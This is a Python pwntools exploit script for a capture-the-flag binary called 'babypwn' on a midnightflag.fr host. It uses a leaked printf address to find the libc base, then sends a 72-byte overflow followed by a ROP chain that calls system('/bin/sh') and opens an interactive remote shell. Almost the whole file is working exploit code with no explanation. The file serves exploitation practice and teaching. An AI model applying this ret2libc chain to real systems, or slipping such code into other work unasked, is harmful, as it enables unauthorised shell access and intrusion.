#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template --host babypwn.pwn.midnightflag.fr --port 16000
from pwn import *

exe = 'babypwn'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'babypwn.pwn.midnightflag.fr'
port = int(args.PORT or 16000)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

context.binary = elf = ELF("babypwn")
rop = ROP(elf)

libc = ELF("libc.so.6")
env = {"LD_PRELOAD": libc} if libc else {}
rop_libc = ROP(libc)

printf_base_addr = libc.sym['printf']
system_base_addr = libc.sym['system']
sh_base_addr = next(libc.search(b"/bin/sh"))
# pop_rdi_addr = rop.find_gadget(['pop rdi', 'ret'])[0] # None there is not this gadget
# rop(rdi=next(libc.search(b"/bin/sh")))                # Error there is no gadget to do this
pop_rdi_addr = rop_libc.find_gadget(['pop rdi', 'ret'])[0]
ret_addr = rop_libc.find_gadget(['ret'])[0]

io = start()

data = io.recvuntil(b'There you go, libc leak: ')
printf_addr = int(io.recv().decode(), 16)
offset = printf_addr - printf_base_addr

log.info(f"printf address:              {hex(printf_addr)}")
log.info(f"printf base address:         {hex(printf_base_addr)}")
log.info(f"system base address:         {hex(system_base_addr)}")
log.info(f"/bin/sh string base address: {hex(sh_base_addr)}")
log.info(f"POP RDI base address:        {hex(pop_rdi_addr)}")
log.info(f"offset base address:         {hex(offset)}")

io.sendline(b"A" * (64 + 8) + p64(pop_rdi_addr + offset) + p64(sh_base_addr + offset) + p64(ret_addr + offset) + p64(system_base_addr + offset)) # SUB RBP, 0x40 + RBP

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

